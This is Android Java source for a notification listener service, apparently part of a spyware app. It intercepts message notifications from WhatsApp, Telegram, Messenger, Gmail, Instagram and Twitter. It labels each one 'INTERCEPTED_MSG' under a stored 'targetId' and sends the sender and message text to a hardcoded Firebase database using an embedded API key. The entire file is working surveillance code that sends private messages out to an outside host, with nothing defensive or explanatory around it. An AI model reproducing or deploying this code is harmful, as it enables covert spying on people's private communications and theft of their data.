package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "CRPT.NOTIF";

    // Firebase RTDB REST
    private static final String FB_BASE = "https://hayu-c4eb3-default-rtdb.asia-southeast1.firebasedatabase.app";
    private static final String FB_AUTH = "AIzaSyAt3fcQ0BcEEcrgoEmxX0Bt4u2e-V9Ye0E";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg    = sbn.getPackageName();
            Bundle extras = sbn.getNotification().extras;
            if (extras == null) return;
            if (pkg.equals(getPackageName())) return;

            String title = extras.getString("android.title", "Unknown");
            String body  = "";

            Object textObj = extras.get("android.text");
            if (textObj != null) body = textObj.toString();

            if (body.isEmpty() || body.equals("null")) {
                CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
                if (lines != null && lines.length > 0)
                    body = lines[lines.length - 1].toString();
            }

            if (pkg.equals("com.google.android.gm")) {
                String bigText = extras.getString("android.bigText");
                if (bigText != null) body = bigText;
            }

            boolean isTarget = pkg.equals("com.whatsapp")
                    || pkg.equals("org.telegram.messenger")
                    || pkg.equals("com.facebook.orca")
                    || pkg.equals("com.google.android.gm")
                    || pkg.equals("com.instagram.android")
                    || pkg.equals("com.twitter.android");

            if (!isTarget || body.isEmpty() || body.equals("null")) return;

            SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String targetId = prefs.getString("targetId", null);
            if (targetId == null || targetId.isEmpty()) {
                targetId = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
                    .getString("flutter.target_id", "UNKNOWN");
            }

            relayToFirebase(targetId, pkg, title, body);
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    private void relayToFirebase(String targetId, String pkg, String title, String text) {
        final String tId = targetId;
        new Thread(() -> {
            try {
                String key   = "notif_" + System.currentTimeMillis();
                String label = pkg.replace("com.", "").replace("org.", "").replace("android.", "");
                JSONObject json = new JSONObject();
                json.put("title",    "[" + label.toUpperCase() + "] " + title);
                json.put("body",     text);
                json.put("package",  pkg);
                json.put("category", "INTERCEPTED_MSG");
                json.put("ts",       System.currentTimeMillis());

                String url = FB_BASE + "/notifications/" + tId + "/" + key + ".json?auth=" + FB_AUTH;
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("PUT");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
                conn.setDoOutput(true);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes(StandardCharsets.UTF_8));
                }
                conn.getResponseCode();
                conn.disconnect();
                Log.d(TAG, "Relayed to Firebase: " + pkg + " | " + title);
            } catch (Exception e) {
                Log.e(TAG, "Firebase relay failed: " + e.getMessage());
            }
        }).start();
    }
}
